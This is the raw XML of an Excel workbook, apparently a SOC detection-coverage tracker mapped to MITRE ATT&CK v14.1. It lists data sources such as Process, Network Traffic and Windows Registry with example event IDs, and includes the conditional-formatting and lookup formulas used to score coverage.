    <t>Changes made to a group, such as membership, name, or permissions (ex: Windows EID 4728 or 4732, AWS IAM UpdateGroup)</t>
  </si>
  <si>
    <t>Image</t>
  </si>
  <si>
    <t>DS0007</t>
  </si>
  <si>
    <t>A single file used to deploy a virtual machine/bootable disk into an on-premise or third-party cloud environment(Citation: Microsoft Image)(Citation: Amazon AMI)</t>
  </si>
  <si>
    <t>Image: Image Creation</t>
  </si>
  <si>
    <t>Initial construction of a virtual machine image (ex: Azure Compute Service Images PUT)</t>
  </si>
  <si>
    <t>Image: Image Deletion</t>
  </si>
  <si>
    <t>Removal of a virtual machine image (ex: Azure Compute Service Images DELETE)</t>
  </si>
  <si>
    <t>Image: Image Metadata</t>
  </si>
  <si>
    <t>Contextual data about a virtual machine image such as name, resource group, state, or type</t>
  </si>
  <si>
    <t>Image: Image Modification</t>
  </si>
  <si>
    <t>Changes made to a virtual machine image, including setting and/or control data (ex: Azure Compute Service Images PATCH)</t>
  </si>
  <si>
    <t>Instance</t>
  </si>
  <si>
    <t>DS0030</t>
  </si>
  <si>
    <t>A virtual server environment which runs workloads, hosted on-premise or by third-party cloud providers(Citation: Amazon VM)(Citation: Google VM)</t>
  </si>
  <si>
    <t>Instance: Instance Creation</t>
  </si>
  <si>
    <t>Initial construction of a new instance (ex: instance.insert within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Instance: Instance Deletion</t>
  </si>
  <si>
    <t>Removal of an instance (ex: instance.delete within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Instance: Instance Enumeration</t>
  </si>
  <si>
    <t>An extracted list of instances within a cloud environment (ex: instance.list within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Instance: Instance Metadata</t>
  </si>
  <si>
    <t>Contextual data about an instance and activity around it such as name, type, or status</t>
  </si>
  <si>
    <t>Instance: Instance Modification</t>
  </si>
  <si>
    <t>Changes made to an instance, including its settings and/or control data (ex: instance.addResourcePolicies or instances.setMetadata within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Instance: Instance Start</t>
  </si>
  <si>
    <t>Activation or invocation of an instance (ex: instance.start within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Instance: Instance Stop</t>
  </si>
  <si>
    <t>Deactivation or stoppage of an instance (ex: instance.stop within GCP Audit Logs)</t>
  </si>
  <si>
    <t>Internet Scan</t>
  </si>
  <si>
    <t>DS0035</t>
  </si>
  <si>
    <t>Information obtained (commonly via active network traffic probes or web crawling) regarding various types of resources and servers connected to the public Internet</t>
  </si>
  <si>
    <t>Logged network traffic in response to a scan showing both protocol header and body values</t>
  </si>
  <si>
    <t>Internet Scan: Response Metadata</t>
  </si>
  <si>
    <t>Contextual data about an Internet-facing resource gathered from a scan, such as running services or ports</t>
  </si>
  <si>
    <t>Kernel</t>
  </si>
  <si>
    <t>DS0008</t>
  </si>
  <si>
    <t>A computer program, at the core of a computer OS, that resides in memory and facilitates interactions between hardware and software components(Citation: STIG Audit Kernel Modules)(Citation: Init Man Page)</t>
  </si>
  <si>
    <t>Kernel: Kernel Module Load</t>
  </si>
  <si>
    <t>An object file that contains code to extend the running kernel of an OS, typically used to add support for new hardware (as device drivers) and/or filesystems, or for adding system calls</t>
  </si>
  <si>
    <t>Logon Session</t>
  </si>
  <si>
    <t>DS0028</t>
  </si>
  <si>
    <t>Cloud Control Plane, Host, Network</t>
  </si>
  <si>
    <t>Logon occurring on a system or resource (local, domain, or cloud) to which a user/device is gaining access after successful authentication and authorization(Citation: Microsoft Audit Logon Events)</t>
  </si>
  <si>
    <t>Initial construction of a successful new user logon following an authentication attempt. (e.g. Windows EID 4624, /var/log/utmp, or /var/log/wmtp)</t>
  </si>
  <si>
    <t>Contextual data about a logon session, such as username, logon type, access tokens (security context, user SIDs, logon identifiers, and logon SID), and any activity associated within it</t>
  </si>
  <si>
    <t>Malware Repository</t>
  </si>
  <si>
    <t>DS0004</t>
  </si>
  <si>
    <t>Information obtained (via shared or submitted samples) regarding malicious software (droppers, backdoors, etc.) used by adversaries</t>
  </si>
  <si>
    <t>Malware Repository: Malware Content</t>
  </si>
  <si>
    <t>Code, strings, and other signatures that compromise a malicious payload</t>
  </si>
  <si>
    <t>Contextual data about a malicious payload, such as compilation times, file hashes, as well as watermarks or other identifiable configuration information</t>
  </si>
  <si>
    <t>Malware Repository: Threat Feed</t>
  </si>
  <si>
    <t>Module</t>
  </si>
  <si>
    <t>DS0011</t>
  </si>
  <si>
    <t>Executable files consisting of one or more shared classes and interfaces, such as portable executable (PE) format binaries/dynamic link libraries (DLL), executable and linkable format (ELF) binaries/shared libraries, and Mach-O format binaries/shared libraries(Citation: Microsoft LoadLibrary)(Citation: Microsoft Module Class)</t>
  </si>
  <si>
    <t>Module: Module Load</t>
  </si>
  <si>
    <t>Attaching a module into the memory of a process/program, typically to access shared resources/features provided by the module (ex: Sysmon EID 7)</t>
  </si>
  <si>
    <t>Named Pipe</t>
  </si>
  <si>
    <t>DS0023</t>
  </si>
  <si>
    <t>Mechanisms that allow inter-process communication locally or over the network. A named pipe is usually found as a file and processes attach to it(Citation: Microsoft Named Pipes)</t>
  </si>
  <si>
    <t>Named Pipe: Named Pipe Metadata</t>
  </si>
  <si>
    <t>Contextual data about a named pipe on a system, including pipe name and creating process (ex: Sysmon EIDs 17-18)</t>
  </si>
  <si>
    <t>Network Share</t>
  </si>
  <si>
    <t>DS0033</t>
  </si>
  <si>
    <t>A storage resource (typically a folder or drive) made available from one host to others using network protocols, such as Server Message Block (SMB) or Network File System (NFS)(Citation: Microsoft NFS Overview)</t>
  </si>
  <si>
    <t>Network Share: Network Share Access</t>
  </si>
  <si>
    <t>Opening a network share, which makes the contents available to the requestor (ex: Windows EID 5140 or 5145)</t>
  </si>
  <si>
    <t>Network Traffic</t>
  </si>
  <si>
    <t>DS0029</t>
  </si>
  <si>
    <t>Android, IaaS, Linux, Windows, iOS, macOS</t>
  </si>
  <si>
    <t>Data transmitted across a network (ex: Web, DNS, Mail, File, etc.), that is either summarized (ex: Netflow) and/or captured as raw data in an analyzable format (ex: PCAP)</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation</t>
  </si>
  <si>
    <t>Initial construction of a network connection, such as capturing socket information with a source/destination IP and port(s) (ex: Windows EID 5156, Sysmon EID 3, or Zeek conn.log)</t>
  </si>
  <si>
    <t>Logged network traffic data showing both protocol header and body values (ex: PCAP)</t>
  </si>
  <si>
    <t>Summarized network packet data, with metrics, such as protocol headers and volume (ex: Netflow or Zeek http.log)</t>
  </si>
  <si>
    <t>Persona</t>
  </si>
  <si>
    <t>DS0021</t>
  </si>
  <si>
    <t>A malicious online profile representing a user commonly used by adversaries to social engineer or otherwise target victims</t>
  </si>
  <si>
    <t>Persona: Social Media</t>
  </si>
  <si>
    <t>Established, compromised, or otherwise acquired social media personas</t>
  </si>
  <si>
    <t>Pod</t>
  </si>
  <si>
    <t>DS0014</t>
  </si>
  <si>
    <t>A single unit of shared resources within a cluster, comprised of one or more containers(Citation: Kube Kubectl)(Citation: Kube Pod)</t>
  </si>
  <si>
    <t>Pod: Pod Creation</t>
  </si>
  <si>
    <t>Initial construction of a new pod (ex: kubectl apply|run)</t>
  </si>
  <si>
    <t>Pod: Pod Enumeration</t>
  </si>
  <si>
    <t>An extracted list of pods within a cluster (ex: kubectl get pods)</t>
  </si>
  <si>
    <t>Pod: Pod Modification</t>
  </si>
  <si>
    <t>Changes made to a pod, including its settings and/or control data (ex: kubectl set|patch|edit)</t>
  </si>
  <si>
    <t>Process</t>
  </si>
  <si>
    <t>DS0009</t>
  </si>
  <si>
    <t>Android, Linux, Windows, iOS, macOS</t>
  </si>
  <si>
    <t>Instances of computer programs that are being executed by at least one thread. Processes have memory space for process executables, loaded modules (DLLs or shared libraries), and allocated memory regions containing everything from user input to application-specific data structures(Citation: Microsoft Processes and Threads)</t>
  </si>
  <si>
    <t>Operating system function/method calls executed by a process</t>
  </si>
  <si>
    <t>Opening of a process by another process, typically to read memory of the target process (ex: Sysmon EID 10)</t>
  </si>
  <si>
    <t>The initial construction of an executable managed by the OS, that may involve one or more tasks or threads. (e.g. Win EID 4688, Sysmon EID 1, cmd.exe &gt; net use, etc.)</t>
  </si>
  <si>
    <t>Process: Process Metadata</t>
  </si>
  <si>
    <t>Contextual data about a running process, which may include information such as environment variables, image name, user/owner, etc.</t>
  </si>
  <si>
    <t>Process: Process Modification</t>
  </si>
  <si>
    <t>Changes made to a process, or its contents, typically to write and/or execute code in the memory of the target process (ex: Sysmon EID 8)</t>
  </si>
  <si>
    <t>Process: Process Termination</t>
  </si>
  <si>
    <t>Exit of a running process (ex: Sysmon EID 5 or Windows EID 4689)</t>
  </si>
  <si>
    <t>Scheduled Job</t>
  </si>
  <si>
    <t>DS0003</t>
  </si>
  <si>
    <t>Automated tasks that can be executed at a specific time or on a recurring schedule running in the background (ex: Cron daemon, task scheduler, BITS)(Citation: Microsoft Tasks)</t>
  </si>
  <si>
    <t>Scheduled Job: Scheduled Job Creation</t>
  </si>
  <si>
    <t>Initial construction of a new scheduled job (ex: Windows EID 4698 or /var/log cron logs)</t>
  </si>
  <si>
    <t>Scheduled Job: Scheduled Job Metadata</t>
  </si>
  <si>
    <t>Contextual data about a scheduled job, which may include information such as name, timing, command(s), etc.</t>
  </si>
  <si>
    <t>Scheduled Job: Scheduled Job Modification</t>
  </si>
  <si>
    <t>Changes made to a scheduled job, such as modifications to the execution launch (ex: Windows EID 4702 or /var/log cron logs)</t>
  </si>
  <si>
    <t>Script</t>
  </si>
  <si>
    <t>DS0012</t>
  </si>
  <si>
    <t>A file or stream containing a list of commands, allowing them to be launched in sequence(Citation: Microsoft PowerShell Logging)(Citation: FireEye PowerShell Logging)(Citation: Microsoft AMSI)</t>
  </si>
  <si>
    <t>Script: Script Execution</t>
  </si>
  <si>
    <t>The execution of a text file that contains code via the interpreter (e.g. Powershell, WMI, Windows EID 4104, etc.)</t>
  </si>
  <si>
    <t>Sensor Health</t>
  </si>
  <si>
    <t>DS0013</t>
  </si>
  <si>
    <t>Information from host telemetry providing insights about system status, errors, or other notable functional activity</t>
  </si>
  <si>
    <t>Logging, messaging, and other artifacts highlighting the health of host sensors (ex: metrics, errors, and/or exceptions from logging applications)</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>DS0019</t>
  </si>
  <si>
    <t>A computer process that is configured to execute continuously in the background and perform system tasks, in some cases before any user has logged in(Citation: Microsoft Services)(Citation: Linux Services Run Levels)</t>
  </si>
  <si>
    <t>Service: Service Creation</t>
  </si>
  <si>
    <t>Initial construction of a new service/daemon (ex: Windows EID 4697 or /var/log daemon logs)</t>
  </si>
  <si>
    <t>Service: Service Metadata</t>
  </si>
  <si>
    <t>Contextual data about a service/daemon, which may include information such as name, service executable, start type, etc.</t>
  </si>
  <si>
    <t>Service: Service Modification</t>
  </si>
  <si>
    <t>Changes made to a service/daemon, such as changes to name, description, and/or start type (ex: Windows EID 7040 or /var/log daemon logs)</t>
  </si>
  <si>
    <t>Snapshot</t>
  </si>
  <si>
    <t>DS0020</t>
  </si>
  <si>
    <t>A point-in-time copy of cloud volumes (files, settings, etc.) that can be created and/or deployed in cloud environments(Citation: Microsoft Snapshot)(Citation: Amazon Snapshots)</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Creation</t>
  </si>
  <si>
    <t>Initial construction of a new snapshot (ex: AWS create-snapshot)</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Deletion</t>
  </si>
  <si>
    <t>Removal of a snapshot (ex: AWS delete-snapshot)</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Enumeration</t>
  </si>
  <si>
    <t>An extracted list of snapshops within a cloud environment (ex: AWS describe-snapshots)</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Metadata</t>
  </si>
  <si>
    <t>Contextual data about a snapshot, which may include information such as ID, type, and status</t>
  </si>
  <si>
    <t>Snapshot: Snapshot Modification</t>
  </si>
  <si>
    <t>Changes made to a snapshop, such as metadata and control data (ex: AWS modify-snapshot-attribute)</t>
  </si>
  <si>
    <t>User Account</t>
  </si>
  <si>
    <t>DS0002</t>
  </si>
  <si>
    <t>Cloud Control Plane, Container, Host</t>
  </si>
  <si>
    <t>A profile representing a user, device, service, or application used to authenticate and access resources</t>
  </si>
  <si>
    <t>An attempt by a user to gain access to a network or computing resource, often by providing credentials (ex: Windows EID 4776 or /var/log/auth.log)</t>
  </si>
  <si>
    <t>Initial construction of a new account (ex: Windows EID 4720 or /etc/passwd logs)</t>
  </si>
  <si>
    <t>User Account: User Account Deletion</t>
  </si>
  <si>
    <t>Removal of an account (ex: Windows EID 4726 or /var/log access/authentication logs)</t>
  </si>
  <si>
    <t>User Account: User Account Metadata</t>
  </si>
  <si>
    <t>Contextual data about an account, which may include a username, user ID, environmental data, etc.</t>
  </si>
  <si>
    <t>Changes made to an account, such as permissions and/or membership in specific groups (ex: Windows EID 4738 or /var/log access/authentication logs)</t>
  </si>
  <si>
    <t>Volume</t>
  </si>
  <si>
    <t>DS0034</t>
  </si>
  <si>
    <t>Block object storage hosted on-premise or by third-party providers, typically made available to resources as virtualized hard drives(Citation: Amazon S3)(Citation: Azure Blob Storage)(Citation: Google Cloud Storage)</t>
  </si>
  <si>
    <t>Volume: Volume Creation</t>
  </si>
  <si>
    <t>Initial construction of a cloud volume (ex: AWS create-volume)</t>
  </si>
  <si>
    <t>Volume: Volume Deletion</t>
  </si>
  <si>
    <t>Removal of a a cloud volume (ex: AWS delete-volume)</t>
  </si>
  <si>
    <t>Volume: Volume Enumeration</t>
  </si>
  <si>
    <t>An extracted list of available volumes within a cloud environment (ex: AWS describe-volumes)</t>
  </si>
  <si>
    <t>Volume: Volume Metadata</t>
  </si>
  <si>
    <t>Contextual data about a cloud volume and activity around it, such as id, type, state, and size</t>
  </si>
  <si>
    <t>Volume: Volume Modification</t>
  </si>
  <si>
    <t>Changes made to a cloud volume, including its settings and control data (ex: AWS modify-volume)</t>
  </si>
  <si>
    <t>WMI</t>
  </si>
  <si>
    <t>DS0005</t>
  </si>
  <si>
    <t>The infrastructure for management data and operations that enables local and remote management of Windows personal computers and servers(Citation: Microsoft WMI System Classes)(Citation: Microsoft WMI Architecture)</t>
  </si>
  <si>
    <t>WMI: WMI Creation</t>
  </si>
  <si>
    <t>Initial construction of a WMI object, such as a filter, consumer, subscription, binding, or provider (ex: Sysmon EIDs 19-21)</t>
  </si>
  <si>
    <t>Web Credential</t>
  </si>
  <si>
    <t>DS0006</t>
  </si>
  <si>
    <t>Credential material, such as session cookies or tokens, used to authenticate to web applications and services(Citation: Medium Authentication Tokens)(Citation: Auth0 Access Tokens)</t>
  </si>
  <si>
    <t>Web Credential: Web Credential Creation</t>
  </si>
  <si>
    <t>Initial construction of new web credential material (ex: Windows EID 1200 or 4769)</t>
  </si>
  <si>
    <t>An attempt by a user to gain access to a network or computing resource by providing web credentials (ex: Windows EID 1202)</t>
  </si>
  <si>
    <t>Windows Registry</t>
  </si>
  <si>
    <t>DS0024</t>
  </si>
  <si>
    <t>A Windows OS hierarchical database that stores much of the information and settings for software programs, hardware devices, user preferences, and operating-system configurations(Citation: Microsoft Registry)</t>
  </si>
  <si>
    <t>Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Opening a Registry Key, typically to read the associated value (ex: Windows EID 4656)</t>
  </si>
  <si>
    <t>Windows Registry: Windows Registry Key Creation</t>
  </si>
  <si>
    <t>Initial construction of a new Registry Key (ex: Windows EID 4656 or Sysmon EID 12)</t>
  </si>
  <si>
    <t>Windows Registry: Windows Registry Key Deletion</t>
  </si>
  <si>
    <t>Removal of a Registry Key (ex: Windows EID 4658 or Sysmon EID 12)</t>
  </si>
  <si>
    <t>Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Changes made to a Registry Key and/or Key value (ex: Windows EID 4657 or Sysmon EID 13|14)</t>
  </si>
  <si>
    <t>Version:</t>
  </si>
  <si>
    <t>ATT&amp;CK v14.1 OCTOBER 31, 2023  -  OUTDATED</t>
  </si>
  <si>
    <t>Need to update to ATT&amp;CK v16.1 - October 31, 2024 - CURRENT</t>
  </si>
  <si>
    <t>Detection Rules MITRE Techniques, &amp; Data Sources Sheet's Column Headings</t>
  </si>
  <si>
    <t>Color</t>
  </si>
  <si>
    <t>Meaning</t>
  </si>
  <si>
    <t>User modification required?</t>
  </si>
  <si>
    <t>Static fields, strings or numbers</t>
  </si>
  <si>
    <t>No</t>
  </si>
  <si>
    <t>Calculated values, with formulas</t>
  </si>
  <si>
    <t>Columns (cells) that expect an input from the users</t>
  </si>
  <si>
    <t>Coverage Sheet</t>
  </si>
  <si>
    <t>Conditional Formatting Formula</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is less than 10%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.001),1,0))</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is more than 10%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.1),1,0))</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is more than 20%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.2),1,0))</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is more than 40%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.4),1,0))</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is more than 60%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.6),1,0))</t>
  </si>
  <si>
    <t>When the detection rules coverage of MITRE ATTACK technique's sub-technique is more than 80%</t>
  </si>
  <si>
    <t>(=IF(AND(ISNUMBER(B1),B1&gt;=0.8),1,0))</t>
  </si>
  <si>
    <t>Strike</t>
  </si>
  <si>
    <t>When a technique is not applicable to your environment, and you add negative one in the Techniques sheets column name "detection rules modifier"</t>
  </si>
  <si>
    <t>(=IF(INDEX(INDIRECT("techniques[technique status]"),MATCH(A2,INDIRECT("techniques[name]"),0))="disabled",1,0))</t>
  </si>
  <si>
    <t>When you have have a detection rule active but no data source is available for the used technique</t>
  </si>
  <si>
    <t>(=IF(INDEX(INDIRECT("techniques[technique status]"),MATCH(A2,INDIRECT("techniques[name]"),0))="inconsistent",1,0))</t>
  </si>
  <si>
    <t>Range:</t>
  </si>
  <si>
    <t>Conditional formatting formula to be applicable only on the names (text) column</t>
  </si>
  <si>
    <t>(=$A$1:$A$200,$C$1:$C$200,$E$1:$E$200,$G$1:$G$200,$I$1:$I$200,$K$1:$K$200,$M$1:$M$200,$O$1:$O$200,$Q$1:$Q$200,$S$1:$S$200,$U$1:$U$200,$W$1:$W$200,$Y$1:$Y$200,$AA$1:$AA$200)</t>
  </si>
  <si>
    <t>Conditional formatting formula to be applicable only on the numeric (percentage) column</t>
  </si>
  <si>
    <t>(=$B$1:$B$200,$D$1:$D$200,$F$1:$F$200,$H$1:$H$200,$J$1:$J$200,$L$1:$L$200,$N$1:$N$200,$P$1:$P$200,$R$1:$R$200,$T$1:$T$200,$V$1:$V$200,$X$1:$X$200,$Z$1:$Z$200,$AB$1:$AB$200)</t>
  </si>
  <si>
    <t>Techniques Sheet</t>
  </si>
  <si>
    <t>When a technique is not applicable to your environment, and you add negative one in the detection rules modifier</t>
  </si>
  <si>
    <t>(=COUNTIF($P2,"disabled"))</t>
  </si>
  <si>
    <t>When you have have a detection rule active but no data source is available for the used technique.</t>
  </si>
  <si>
    <t>(=COUNTIF($P2,"inconsistent"))</t>
  </si>
  <si>
    <t>When a data source is available but no detection rule is active for the same technique.</t>
  </si>
  <si>
    <t>(=COUNTIF($P2,"no detect"))</t>
  </si>
  <si>
    <t>When you have have a detection rule active and a data source relevant to the technquer is also available.</t>
  </si>
  <si>
    <t>(=COUNTIF($P2,"detect"))</t>
  </si>
  <si>
    <t>Conditional formatting formula to be applicable on the whole sheet/table</t>
  </si>
  <si>
    <t>(=$A$2:$P$627)</t>
  </si>
  <si>
    <t>Sources Sheet</t>
  </si>
  <si>
    <t>When a data source is connected</t>
  </si>
  <si>
    <t>(=IF($C2="yes",1,0))</t>
  </si>
  <si>
    <t>Formula Used in Coverage Sheet</t>
  </si>
  <si>
    <t>{=IF(A2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A2,Techniques[Name],0)),""),"")}</t>
  </si>
  <si>
    <t>Check if A2 is non-empty</t>
  </si>
  <si>
    <t>{=IF(A2&lt;&gt;"", ...)}</t>
  </si>
  <si>
    <t>This checks if cell A2 contains any text. If A2 is empty, the formula will return an empty string "". If A2 contains some text, the formula will continue to the next part.</t>
  </si>
  <si>
    <t>Lookup the corresponding 'Coverage' value:</t>
  </si>
  <si>
    <t>{INDEX(Techniques[Coverage],MATCH(A2,Techniques[Name],0))}</t>
  </si>
  <si>
    <t>Here, MATCH finds the position of the value in A2 within the Name column of the Techniques table. INDEX then retrieves the corresponding value from the Coverage column at the position specified by the MATCH function.</t>
  </si>
  <si>
    <t>Check if the 'Coverage' value is greater than 0</t>
  </si>
  <si>
    <t>{IF(INDEX(...) &gt; 0, INDEX(...), "")}</t>
  </si>
  <si>
    <t>The IF function checks if the Coverage value obtained from the INDEX function is greater than 0. If it is, the INDEX value is returned as the result of the formula. If it is not (meaning the value is 0 or negative), the formula returns an empty string "".</t>
  </si>
  <si>
    <t>Return the result or an empty string if A2 is empty:</t>
  </si>
  <si>
    <t>{=IF(A2&lt;&gt;"", IF(...), "")}</t>
  </si>
  <si>
    <t>The outer IF ensures that the entire formula results in an empty string if A2 was empty to start with, effectively making the formula return a result only if there is a value in A2 to match.</t>
  </si>
  <si>
    <t>From MITRE to Excel Conversion</t>
  </si>
  <si>
    <t xml:space="preserve">To remove leading spaces </t>
  </si>
  <si>
    <t>{=TRIM(A2)}</t>
  </si>
  <si>
    <t>To merge technique ID and technique name columns</t>
  </si>
  <si>
    <t>{=B2&amp;" ("&amp;A2&amp;")"}</t>
  </si>
  <si>
    <t>Month</t>
  </si>
  <si>
    <t>March</t>
  </si>
  <si>
    <t>April</t>
  </si>
  <si>
    <t>May</t>
  </si>
  <si>
    <t>June</t>
  </si>
  <si>
    <t>July</t>
  </si>
  <si>
    <t>August</t>
  </si>
  <si>
    <t>September</t>
  </si>
  <si>
    <t>October</t>
  </si>
  <si>
    <t>November</t>
  </si>
  <si>
    <t>December</t>
  </si>
  <si>
    <t>Standards</t>
  </si>
  <si>
    <t>Minimum Baseline</t>
  </si>
  <si>
    <t>Desired State</t>
  </si>
  <si>
    <t>Current Controls</t>
  </si>
  <si>
    <t>IBM Qradar</t>
  </si>
  <si>
    <t>Microsoft Sentinel</t>
  </si>
  <si>
    <t>Microsoft Defender</t>
  </si>
  <si>
    <t>Crowdstrike EDR</t>
  </si>
  <si>
    <t>Detection Rule 1</t>
  </si>
  <si>
    <t>Detection Rule 2</t>
  </si>
  <si>
    <t>Detection Rule 3</t>
  </si>
  <si>
    <t>EDR Rule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</si>
</sst>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u/>
      <sz val="11"/>
      <color theme="10"/>
      <name val="Calibri"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="8"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="8"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <i/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <strike/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
  </fonts>
  <fills count="19">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0" tint="-0.14999847407452621"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="3" tint="0.79998168889431442"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFF2CC"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFE699"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFDDEBF7"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFBDD7EE"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFC6E0B4"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FF92D050"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFD9D9D9"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFF000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8D3C0"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFB5E1F2"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFD5E9CD"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="6">
    <border>
      <left/>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thin">
        <color auto="1"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thin">
        <color auto="1"/>
      </right>
      <top/>
      <bottom style="thin">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color indexed="64"/>
      </left>
      <right style="thin">
        <color auto="1"/>
      </right>
      <top/>
      <bottom style="thin">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color indexed="64"/>
      </left>
      <right/>
      <top/>
      <bottom style="thin">
        <color indexed="64"/>
      </bottom>
      <diagonal/>
    </border>
  </borders>
  <cellStyleXfs count="2">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" applyNumberFormat="0" applyFill="0" applyBorder="0" applyAlignment="0" applyProtection="0">
      <alignment vertical="top"/>
      <protection locked="0"/>
    </xf>
  </cellStyleXfs>
  <cellXfs count="61">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>
    <xf numFmtId="0" fontId="3" fillId="0" borderId="2" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="9" fontId="4" fillId="0" borderId="3" xfId="0" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="0" borderId="1" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="2" borderId="4" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="4" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top"/>
    </xf>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="3" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="top"/>
    </xf>
